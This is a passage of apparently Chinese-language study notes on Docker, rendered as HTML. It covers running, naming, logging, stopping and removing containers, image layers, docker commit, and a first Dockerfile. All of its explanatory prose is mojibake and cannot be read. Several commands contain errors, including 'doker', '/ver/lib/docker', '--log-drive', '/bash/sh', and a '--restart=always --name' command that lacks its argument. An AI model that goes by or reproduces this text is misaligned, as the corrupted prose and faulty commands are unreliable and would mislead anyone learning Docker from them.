‡å¿—æ¥æŒ‡å®šåç§°:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ sudo doker <span class="hljs-built_in">run</span> <span class="hljs-comment">--name bob_the_container -i -t ubuntu /bin/bash</span><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªåˆæ³•çš„åç§°åªèƒ½åŒ…æ‹¬ <code>[a-zA-Z0-9.-]</code></p><p>å¾ˆå¤š Docker å‘½ä»¤ä¸­ï¼Œéƒ½å¯ä»¥ç”¨å®¹å™¨çš„åç§°æ¥æ›¿ä»£å®¹å™¨ ID.</p><p>å®¹å™¨çš„å‘½åæ˜¯å”¯ä¸€çš„ã€‚</p><p>ç”¨ <code>docker rm</code> å¯åˆ æ‰å®¹å™¨ã€‚</p><h2 id="3-5-é‡æ–°å¯åŠ¨å·²ç»åœæ­¢çš„å®¹å™¨"><a href="#3-5-é‡æ–°å¯åŠ¨å·²ç»åœæ­¢çš„å®¹å™¨" class="headerlink" title="3.5 é‡æ–°å¯åŠ¨å·²ç»åœæ­¢çš„å®¹å™¨"></a>3.5 é‡æ–°å¯åŠ¨å·²ç»åœæ­¢çš„å®¹å™¨</h2><p>å¯åŠ¨åœæ­¢çš„å®¹å™¨:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">start</span> bob_the_container <span class="hljs-comment"># ä¹Ÿå¯ä»¥ä½¿ç”¨å®¹å™¨ ID</span><br></code></pre></td></tr></table></figure><p>é‡æ–°å¯åŠ¨ç”¨ <code>docker restart</code></p><p>ä½¿ç”¨ <code>docker create</code> åˆ›å»ºä¸€ä¸ªå®¹å™¨ä½†ä¸è¿è¡Œå®ƒ.</p><h2 id="3-6-é™„ç€åˆ°å®¹å™¨ä¸Š"><a href="#3-6-é™„ç€åˆ°å®¹å™¨ä¸Š" class="headerlink" title="3.6 é™„ç€åˆ°å®¹å™¨ä¸Š"></a>3.6 é™„ç€åˆ°å®¹å™¨ä¸Š</h2><p>Docker å®¹å™¨é‡æ–°å¯åŠ¨çš„æ—¶å€™ï¼Œä¼šæ²¿ç”¨ <code>docker run</code> å‘½ä»¤æ—¶æŒ‡å®šçš„å‚æ•°æ¥è¿è¡Œã€‚</p><p>ä¹Ÿå¯ä»¥ç”¨ <code>docker attach</code> å‘½ä»¤é‡æ–°é™„ç€åˆ°è¯¥å®¹å™¨çš„ä¼šè¯ä¸Š:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo docker attach bob_the_container<br></code></pre></td></tr></table></figure><h2 id="3-7-åˆ›å»ºå®ˆæŠ¤å¼å®¹å™¨"><a href="#3-7-åˆ›å»ºå®ˆæŠ¤å¼å®¹å™¨" class="headerlink" title="3.7 åˆ›å»ºå®ˆæŠ¤å¼å®¹å™¨"></a>3.7 åˆ›å»ºå®ˆæŠ¤å¼å®¹å™¨</h2><p>é™¤äº¤äº’å¼è¿è¡Œçš„å®¹å™¨(interactive container) è¿˜æœ‰å®ˆæŠ¤å¼å®¹å™¨(daemonized container), å…¶æ²¡æœ‰äº¤äº’å¼ä¼šè¯ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run --name daemon_dave -d ubuntu <span class="hljs-regexp">/bin/</span>sh -c <span class="hljs-string">&quot;while true; do echo hello world; sleep 1; done&quot;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-d</code> å‚æ•°ï¼Œå³æ”¾å…¥åå°è¿è¡Œã€‚</p><h2 id="3-8-å®¹å™¨å†…éƒ¨éƒ½åœ¨å¹²äº›ä»€ä¹ˆ"><a href="#3-8-å®¹å™¨å†…éƒ¨éƒ½åœ¨å¹²äº›ä»€ä¹ˆ" class="headerlink" title="3.8 å®¹å™¨å†…éƒ¨éƒ½åœ¨å¹²äº›ä»€ä¹ˆ"></a>3.8 å®¹å™¨å†…éƒ¨éƒ½åœ¨å¹²äº›ä»€ä¹ˆ</h2><p>ä½¿ç”¨ <code>docker logs</code> è·å–å®¹å™¨çš„æ—¥å¿—.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker logs daemon_dave<br></code></pre></td></tr></table></figure><p>å¯åŠ å…¥ <code>-f</code> é€‰é¡¹:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker logs <span class="hljs-operator">-f</span> daemon_dave<br></code></pre></td></tr></table></figure><p>è·å–æœ€ååè¡Œ:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker logs --<span class="hljs-built_in">tail</span> 10 daemon_dave</span><br></code></pre></td></tr></table></figure><p>åŠ ä¸Šæ—¶é—´æˆ³:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker logs -ft daemon_dave<br></code></pre></td></tr></table></figure><h2 id="3-9-Docker-æ—¥å¿—é©±åŠ¨"><a href="#3-9-Docker-æ—¥å¿—é©±åŠ¨" class="headerlink" title="3.9 Docker æ—¥å¿—é©±åŠ¨"></a>3.9 Docker æ—¥å¿—é©±åŠ¨</h2><p>ä½¿ç”¨ <code>--log-drive</code> é€‰é¡¹:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ sudo docker run <span class="hljs-params">--log-driver=</span><span class="hljs-string">&quot;syslog&quot;</span> <span class="hljs-params">--name</span> daemon_dwayne -d ubuntu <span class="hljs-string">/bash/sh</span> -c <span class="hljs-string">&quot;while true; do echo hello world; sleep 1; done&quot;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>syslog</code> æ—¶ä¼šè­¦ç”¨ <code>docker logs</code> å‘½ä»¤ï¼Œå¹¶å°†æ‰€æœ‰å®¹å™¨çš„æ—¥å¿—è¾“å‡ºéƒ½é‡å®šå‘åˆ° <code>Syslog</code>.</p><p>è‹¥ä½¿ç”¨ <code>none</code> åˆ™ç¦ç”¨æ—¥å¿—ã€‚</p><h2 id="3-10-æŸ¥çœ‹å®¹å™¨å†…çš„è¿›ç¨‹"><a href="#3-10-æŸ¥çœ‹å®¹å™¨å†…çš„è¿›ç¨‹" class="headerlink" title="3.10 æŸ¥çœ‹å®¹å™¨å†…çš„è¿›ç¨‹"></a>3.10 æŸ¥çœ‹å®¹å™¨å†…çš„è¿›ç¨‹</h2><p>ä½¿ç”¨ <code>docker top</code> å‘½ä»¤:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">$ sudo docker <span class="hljs-built_in">top</span> daemon_dave<br></code></pre></td></tr></table></figure><h2 id="3-11-Docker-ç»Ÿè®¡ä¿¡æ¯"><a href="#3-11-Docker-ç»Ÿè®¡ä¿¡æ¯" class="headerlink" title="3.11 Docker ç»Ÿè®¡ä¿¡æ¯"></a>3.11 Docker ç»Ÿè®¡ä¿¡æ¯</h2><p><code>docker stats</code> æ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨çš„ç»Ÿè®¡ä¿¡æ¯:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker stats daemon_dave daemon_kate daemon_clare<br></code></pre></td></tr></table></figure><h2 id="3-12-åœ¨å®¹å™¨å†…éƒ¨è¿è¡Œè¿›ç¨‹"><a href="#3-12-åœ¨å®¹å™¨å†…éƒ¨è¿è¡Œè¿›ç¨‹" class="headerlink" title="3.12 åœ¨å®¹å™¨å†…éƒ¨è¿è¡Œè¿›ç¨‹"></a>3.12 åœ¨å®¹å™¨å†…éƒ¨è¿è¡Œè¿›ç¨‹</h2><p>å¯ä»¥å†å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹æœ‰ä¸¤ç§ç±»å‹:</p><ul><li>åå°ä»»åŠ¡</li><li>äº¤äº’å¼ä»»åŠ¡</li></ul><p>ä½¿ç”¨ <code>docker exec</code> å‘½ä»¤:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker <span class="hljs-built_in">exec</span> -d daemon_dave <span class="hljs-built_in">touch</span> /etc/new_config_file</span><br></code></pre></td></tr></table></figure><p>å°±æ˜¯å¯¹ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨ä½¿ç”¨ã€‚</p><h2 id="3-13-åœæ­¢å®ˆæŠ¤å¼å®¹å™¨"><a href="#3-13-åœæ­¢å®ˆæŠ¤å¼å®¹å™¨" class="headerlink" title="3.13 åœæ­¢å®ˆæŠ¤å¼å®¹å™¨"></a>3.13 åœæ­¢å®ˆæŠ¤å¼å®¹å™¨</h2><p>ä½¿ç”¨ <code>docker stop</code> å‘½ä»¤:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo docker stop daemon_dave<br></code></pre></td></tr></table></figure><p>äº¤äº’å¼å¯ä»¥é€šè¿‡ <code>exit</code></p><p>æƒ³è¦å¿«é€Ÿåœæ­¢æŸä¸ªå®¹å™¨ï¼Œä½¿ç”¨ <code>docker kill</code>:</p><p>æ˜¾ç¤ºæœ€å x ä¸ªå®¹å™¨:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-n</span> x<br></code></pre></td></tr></table></figure><h2 id="3-14-è‡ªåŠ¨é‡å¯å®¹å™¨"><a href="#3-14-è‡ªåŠ¨é‡å¯å®¹å™¨" class="headerlink" title="3.14 è‡ªåŠ¨é‡å¯å®¹å™¨"></a>3.14 è‡ªåŠ¨é‡å¯å®¹å™¨</h2><p>ä½¿ç”¨ <code>--restart</code> æ ‡å¿—ï¼Œç£¨äººçš„è¡Œä¸ºæ˜¯ Docker ä¸ä¼šé‡å¯å®¹å™¨ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker <span class="hljs-built_in">run</span> <span class="hljs-attribute">--restart</span>=always --name <br></code></pre></td></tr></table></figure><p>å¦ä¸€ä¸ª <code>on-failure</code> å‚æ•°ï¼Œå³åœ¨é€€å‡ºçŠ¶æ€ç ä¸ºé 0 å€¼æ—¶é‡å¯ï¼Œä¸”å¯æŒ‡å®šé‡å¯æ¬¡æ•°:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--restart</span>=<span class="hljs-literal">on</span>-failure:<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="3-15-æ·±å…¥å®¹å™¨"><a href="#3-15-æ·±å…¥å®¹å™¨" class="headerlink" title="3.15 æ·±å…¥å®¹å™¨"></a>3.15 æ·±å…¥å®¹å™¨</h2><p><code>docker inspect</code> è·å–æ›´å¤šå®¹å™¨ä¿¡æ¯:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker inspect daemon_dave<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-f</code> æˆ– <code>--format</code> æ ‡å¿—é€‰å®šæŸ¥çœ‹ç»“æœ:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$ sudo docker inspect --format=&#x27;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">.State.Running</span> &#125;&#125;</span><span class="language-xml">&#x27; daemon_dave</span><br></code></pre></td></tr></table></figure><p>å¯æŒ‡å®šå¤šä¸ªå®¹å™¨.</p><h2 id="3-16-åˆ é™¤å®¹å™¨"><a href="#3-16-åˆ é™¤å®¹å™¨" class="headerlink" title="3.16 åˆ é™¤å®¹å™¨"></a>3.16 åˆ é™¤å®¹å™¨</h2><p>ä½¿ç”¨ <code>docker rm</code> å‘½ä»¤:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">rm</span> <span class="hljs-number">80430</span>f8d0921<br></code></pre></td></tr></table></figure><p>å¯ä¼ é€’ <code>-f</code> å‚æ•°ã€‚</p><p>åˆ é™¤æ‰€æœ‰å®¹å™¨:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">rm</span> `sudo docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-a</span> <span class="hljs-literal">-q</span>`<br></code></pre></td></tr></table></figure><h1 id="ç¬¬4ç« -ä½¿ç”¨-Docker-é•œåƒå’Œä»“åº“"><a href="#ç¬¬4ç« -ä½¿ç”¨-Docker-é•œåƒå’Œä»“åº“" class="headerlink" title="ç¬¬4ç«  ä½¿ç”¨ Docker é•œåƒå’Œä»“åº“"></a>ç¬¬4ç«  ä½¿ç”¨ Docker é•œåƒå’Œä»“åº“</h1><h2 id="4-1-ä»€ä¹ˆæ˜¯-Docker-é•œåƒ"><a href="#4-1-ä»€ä¹ˆæ˜¯-Docker-é•œåƒ" class="headerlink" title="4.1 ä»€ä¹ˆæ˜¯ Docker é•œåƒ"></a>4.1 ä»€ä¹ˆæ˜¯ Docker é•œåƒ</h2><p>Docker é•œåƒæ˜¯ç”±æ–‡ä»¶ç³»ç»Ÿå åŠ è€Œæˆã€‚</p><p>æœ€ä½ç«¯æ˜¯ä¸€ä¸ªå¼•å¯¼æ–‡ä»¶ç³»ç»Ÿ bootfs.</p><p>å½“ä¸€ä¸ªå®¹å™¨å¯åŠ¨åï¼Œå®ƒä¼šè¢«ç§»åˆ°å†…å­˜ä¸­ï¼Œè€Œå¼•å¯¼æ–‡ä»¶ç³»ç»Ÿåˆ™ä¼šè¢«å¸è½½(unmount).</p><p>Docker é•œåƒçš„ç¬¬äºŒå±‚æ˜¯ root æ–‡ä»¶ç³»ç»Ÿ rootfs, å…¶ä½äºå¼•å¯¼æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šã€‚</p><p>Docker åˆ©ç”¨è”åˆåŠ è½½æŠ€æœ¯(union mount), å³ä¸€æ¬¡åŒæ—¶åŠ è½½å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯åœ¨å¤–é¢çœ‹èµ·æ¥åªèƒ½çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚</p><p>è”åˆåŠ è½½ä¼šå°†å„å±‚æ–‡ä»¶ç³»ç»Ÿå åŠ åˆ°ä¸€èµ·ï¼Œè¿™æ ·æœ€ç»ˆçš„æ–‡ä»¶ç³»ç»Ÿä¼šåŒ…å«æ‰€æœ‰åº•å±‚çš„æ–‡ä»¶å’Œç›®å½•ã€‚</p><p>Docker å°†è¿™æ ·çš„æ–‡ä»¶ç³»ç»Ÿç§°ä¸ºé•œåƒã€‚ä¸€ä¸ªé•œåƒå¯ä»¥æ”¾åˆ°å¦ä¸€ä¸ªé•œåƒçš„é¡¶éƒ¨ã€‚ä½äºä¸‹é¢çš„é•œåƒç§°ä¸ºçˆ¶é•œåƒ(parent image), æœ€åº•å±‚çš„é•œåƒç§°ä¸ºåŸºç¡€é•œåƒ(base image).</p><p>å½“ä»ä¸€ä¸ªé•œåƒå¯åŠ¨å®¹å™¨æ—¶ï¼ŒDocker ä¼šåœ¨è¯¥é•œåƒæœ€é¡¶å±‚åŠ è½½ä¸€ä¸ªè¯»å†™æ–‡ä»¶ç³»ç»Ÿï¼Œæˆ‘ä»¬åœ¨ Docke ä¸­è¿è¡Œçš„ç¨‹åºå°±æ˜¯åœ¨è¿™ä¸ªè¯»å†™å±‚ä¸­æ‰§è¡Œã€‚</p><p>æ¯ä¸ªåªè¯»é•œåƒå±‚éƒ½æ˜¯åªè¯»ï¼Œå¹¶ä¸”ä»¥åæ°¸è¿œä¸ä¼šå˜åŒ–ã€‚</p><p>å†™æ—¶å¤åˆ¶(copy on write)æœºåˆ¶ï¼Œæƒ³ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶é¦–å…ˆä¼šä»è¯¥è¯»å†™å±‚ä¸‹é¢çš„åªè¯»å±‚å¤åˆ¶åˆ°è¯¥è¯»å†™å±‚ï¼Œè¯¥æ–‡ä»¶çš„åªè¯»ç‰ˆæœ¬ä¾ç„¶å­˜åœ¨ï¼Œä½†æ˜¯è¢«è¯»å†™å±‚ä¸­çš„è¯¥æ–‡ä»¶å‰¯æœ¬æ‰€éšè—ã€‚</p><h2 id="4-2-åˆ—å‡ºé•œåƒ"><a href="#4-2-åˆ—å‡ºé•œåƒ" class="headerlink" title="4.2 åˆ—å‡ºé•œåƒ"></a>4.2 åˆ—å‡ºé•œåƒ</h2><p>åˆ—å‡ºä¸»æœºä¸Šå¯ç”¨çš„é•œåƒ, ä½¿ç”¨ <code>docker images</code>:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker images<br></code></pre></td></tr></table></figure><p>æœ¬åœ°é•œåƒéƒ½ä¿å­˜åœ¨ Docker å®¿ä¸»æœºçš„ <code>/ver/lib/docker</code> ç›®å½•ä¸‹.</p><p>é•œåƒä»ä»“åº“ä¸‹è½½ï¼Œé•œåƒä¿å­˜åœ¨ä»“åº“ä¸­ï¼Œä»“åº“å­˜åœ¨äº Registry ä¸­ã€‚</p><p>æ¯ä¸ªé•œåƒä»“åº“éƒ½å¯ä»¥å­˜æ”¾å¾ˆå¤šé•œåƒ.</p><p>ä½¿ç”¨ <code>docker pull</code> å‘½ä»¤æ¥æ‹‰å–ä»“åº“ä¸­çš„é•œåƒã€‚</p><p>å¯ä»¥é€šè¿‡åœ¨ä»“åº“ååé¢åŠ ä¸Šä¸€ä¸ªå†’å·å’Œæ ‡ç­¾åæ¥æŒ‡å®šè¯¥ä»“åº“ä¸­çš„æŸä¸€é•œåƒ:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ sudo docker <span class="hljs-built_in">run</span> -t -i <span class="hljs-comment">--name new_container ubuntu:12.04 /bin/bash</span><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªé•œåƒå¯ä»¥æœ‰å¤šä¸ªæ ‡ç­¾ã€‚</p><p>Docker Hub ä¸­æœ‰ä¸¤ç§ç±»å‹çš„ä»“åº“:</p><ul><li>ç”¨æˆ·ä»“åº“(user repository), éƒ½æ˜¯ç”± Docker ç”¨æˆ·åˆ›å»ºçš„, å…¶å‘½åç”±ç”¨æˆ·åå’Œä»“åº“åä¸¤éƒ¨åˆ†ç»„æˆ</li><li>é¡¶å±‚ä»“åº“(top-level repository), ç”± Docker å†…éƒ¨çš„äººæ¥ç®¡ç†, å…¶å‘½ååªåŒ…å«ä»“åº“å</li></ul><h2 id="4-3-æ‹‰å–é•œåƒ"><a href="#4-3-æ‹‰å–é•œåƒ" class="headerlink" title="4.3 æ‹‰å–é•œåƒ"></a>4.3 æ‹‰å–é•œåƒ</h2><p>å¦‚:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker pull <span class="hljs-symbol">fedora:</span><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h2 id="4-4-æŸ¥æ‰¾é•œåƒ"><a href="#4-4-æŸ¥æ‰¾é•œåƒ" class="headerlink" title="4.4 æŸ¥æ‰¾é•œåƒ"></a>4.4 æŸ¥æ‰¾é•œåƒ</h2><p>ä½¿ç”¨ <code>docker search</code> å‘½ä»¤æ¥æŸ¥æ‰¾æ‰€æœ‰ Docker Hub ä¸Šå…¬å…±çš„å¯ç”¨é•œåƒã€‚</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker search puppet<br></code></pre></td></tr></table></figure><h2 id="4-5-æ„å»ºé•œåƒ"><a href="#4-5-æ„å»ºé•œåƒ" class="headerlink" title="4.5 æ„å»ºé•œåƒ"></a>4.5 æ„å»ºé•œåƒ</h2><p>ä¸¤ç§æ–¹æ³•:</p><ul><li>docker commit</li><li>docker build å’Œ Dockerfile æ–‡ä»¶<br>ä½¿ç”¨ <code>Dockerfile</code> æ›´åŠ çµæ´».</li></ul><h3 id="4-5-1-åˆ›å»º-Docker-Hub"><a href="#4-5-1-åˆ›å»º-Docker-Hub" class="headerlink" title="4.5.1 åˆ›å»º Docker Hub"></a>4.5.1 åˆ›å»º Docker Hub</h3><p>ç™»å½•åˆ° Docker Hub, ä½¿ç”¨ <code>docker login</code> å‘½ä»¤:<br><code>$ sudo docker login</code><br>ç”¨æˆ·çš„ä¸ªäººè®¤è¯ä¿¡æ¯ä¼šè¢«ä¿å­˜åœ¨ <code>$HOME/.docker/config.json</code> ä¸­ã€‚</p><h3 id="4-5-2-ç”¨-Docker-çš„-commit-å‘½ä»¤åˆ›å»ºé•œåƒ"><a href="#4-5-2-ç”¨-Docker-çš„-commit-å‘½ä»¤åˆ›å»ºé•œåƒ" class="headerlink" title="4.5.2 ç”¨ Docker çš„ commit å‘½ä»¤åˆ›å»ºé•œåƒ"></a>4.5.2 ç”¨ Docker çš„ commit å‘½ä»¤åˆ›å»ºé•œåƒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker commit 4aab3ce3cb76 jamtur01/apache2</span><br></code></pre></td></tr></table></figure><p><code>4aab3ce3cb76</code> æ˜¯å®¹å™¨çš„ ID, <code>jamtur01</code> æ˜¯ç›®æ ‡é•œåƒä»“åº“, <code>apache2</code> æ˜¯é•œåƒå.</p><p><code>docker commit</code> æäº¤çš„åªæ˜¯åˆ›å»ºå®¹å™¨çš„é•œåƒä¸å®¹å™¨çš„å½“å‰çŠ¶æ€ä¹‹é—´æœ‰å·®å¼‚çš„éƒ¨åˆ†ã€‚</p><p>å¯ä»¥åœ¨æäº¤é•œåƒæ—¶æŒ‡å®šæ›´å¤šçš„æ•°æ®(åŒ…æ‹¬æ ‡ç­¾):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker commit -m<span class="hljs-string">&quot;A new custom image&quot;</span> -a<span class="hljs-string">&quot;James Turnbull&quot;</span> 4aab3ce3cb76 jamtur01/apache2:webserver</span><br></code></pre></td></tr></table></figure><p><code>-m</code> é€‰é¡¹æ˜¯åˆ›å»ºé•œåƒçš„æäº¤ä¿¡æ¯ã€‚</p><p><code>-a</code> é€‰é¡¹æ˜¯è¯¥é•œåƒçš„ä½œè€…ä¿¡æ¯ã€‚</p><p><code>webserver</code> æ˜¯æ ‡ç­¾åã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>docker inspect</code> å‘½ä»¤æ¥æŸ¥çœ‹æ–°åˆ›å»ºçš„é•œåƒçš„è¯¦ç»†ä¿¡æ¯:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker inspect jamtur01/apache2:webserver</span><br></code></pre></td></tr></table></figure><h3 id="4-5-3-ç”¨-Dockerfile-æ„å»ºé•œåƒ"><a href="#4-5-3-ç”¨-Dockerfile-æ„å»ºé•œåƒ" class="headerlink" title="4.5.3 ç”¨ Dockerfile æ„å»ºé•œåƒ"></a>4.5.3 ç”¨ Dockerfile æ„å»ºé•œåƒ</h3><p>ä¸€èˆ¬ä¸æ¨èä½¿ç”¨ <code>docker commit</code> æ¥æ„å»ºé•œåƒã€‚</p><p>Dockerfile ä½¿ç”¨åŸºæœ¬çš„åŸºäº DSL(Domain Specific Language) è¯­æ³•çš„æŒ‡ä»¤æ¥æ„å»ºä¸€ä¸ª Docker é•œåƒã€‚</p><h4 id="ç¬¬ä¸€ä¸ª-Dockerfile"><a href="#ç¬¬ä¸€ä¸ª-Dockerfile" class="headerlink" title="ç¬¬ä¸€ä¸ª Dockerfile"></a>ç¬¬ä¸€ä¸ª Dockerfile</h4><p>åˆ›å»ºçš„ç”¨æ¥ä¿å­˜ Dockerfile çš„ç›®å½•ç§°ä¸ºæ„å»ºç¯å¢ƒ(build environment), Docker åˆ™ç§°æ­¤ç¯å¢ƒä¸ºä¸Šä¸‹æ–‡(context)æˆ–æ„å»ºä¸Šä¸‹æ–‡(build context),</p><p>Docker ä¼šåœ¨æ„å»ºé•œåƒæ—¶å°†æ„å»ºä¸Šä¸‹æ–‡å’Œè¯¥ä¸Šä¸‹æ–‡ä¸­çš„æ–‡ä»¶å’Œç›®å½•ä¸Šä¼ åˆ° Docker å®ˆæŠ¤è¿›ç¨‹ã€‚</p><p>ä¾‹å­:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># Version: 0.0.1</span><br><span class="hljs-keyword">FROM</span> ubuntu:14.04<br>MAINTAINER james Turnbull <span class="hljs-string">&quot;james@example.com&quot;</span><br><span class="hljs-built_in">RUN</span> apt-<span class="hljs-built_in">get</span> update &amp;&amp; apt-<span class="hljs-built_in">get</span> install -y nginx<br><span class="hljs-built_in">RUN</span> echo <span class="hljs-string">&#x27;Hi, I am in your container&#x27;</span> \<br>    &gt;/usr/share/nginx/html/index.html<br>EXPOSE 80<br></code></pre></td></tr></table></figure><p>Dockerfile ç”±æŒ‡ä»¤å’Œå‚æ•°æ„æˆã€‚</p><p>æ¯æ¡æŒ‡ä»¤ï¼Œå¦‚ <code>FROM</code>, éƒ½å¿…é¡»ä¸ºå¤§å†™å­—æ¯, è€Œä¸”åé¢è¦è·Ÿéšä¸€ä¸ªå‚æ•°.</p><p>æ¯æ¡æŒ‡ä»¤éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒå±‚å¹¶å¯¹é•œåƒè¿›è¡Œæäº¤ã€‚</p><p>è¿è¡Œæµç¨‹:</p><ul><li>Dockerä»åŸºç¡€é•œåƒè¿è¡Œä¸€ä¸ªå®¹å™¨ã€‚<br>  -æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ï¼Œå¯¹å®¹å™¨åšå‡ºä¿®æ”¹ã€‚<br>  -æ‰§è¡Œç±»ä¼¼docker commitçš„æ“ä½œï¼Œæäº¤ä¸€ä¸ªæ–°çš„é•œåƒå±‚ã€‚<br>  -Dockerå†åŸºäºåˆšæäº¤çš„é•œåƒè¿è¡Œä¸€ä¸ªæ–°å®¹å™¨ã€‚<br>  -æ‰§è¡ŒDockerfileä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œç›´åˆ°æ‰€æœ‰æŒ‡ä»¤éƒ½æ‰§è¡Œå®Œæ¯•</li></ul><p>Dockerfile ä¸­çš„æ³¨é‡Šæ˜¯ <code>#</code> å¼€å¤´çš„è¡Œ.</p><p><code>MAINTAINER</code> æŒ‡ä»¤å‘Šè¯‰ Docker è¯¥é•œåƒçš„ä½œè€…æ˜¯è°ï¼Œä»¥åŠä½œè€…çš„ç”µå­é‚®ä»¶åœ°å€ã€‚</p><p><code>RUN</code> æŒ‡ä»¤ä¼šåœ¨å½“å‰é•œåƒä¸­è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤. æ¯æ¡ <code>RUN</code> æŒ‡ä»¤éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒå±‚ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>RUN</code> æŒ‡ä»¤ä¼šåœ¨ shell é‡Œä½¿ç”¨ <code>/bin/sh -c</code> æ¥æ‰§è¡Œã€‚</p><p>è‹¥åœ¨ä¸æ”¯æŒ shell çš„å¹³å°ä¸Šï¼Œä½¿ç”¨ <code>exec</code> æ ¼å¼çš„ <code>RUN</code> æŒ‡ä»¤:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">RUN</span> 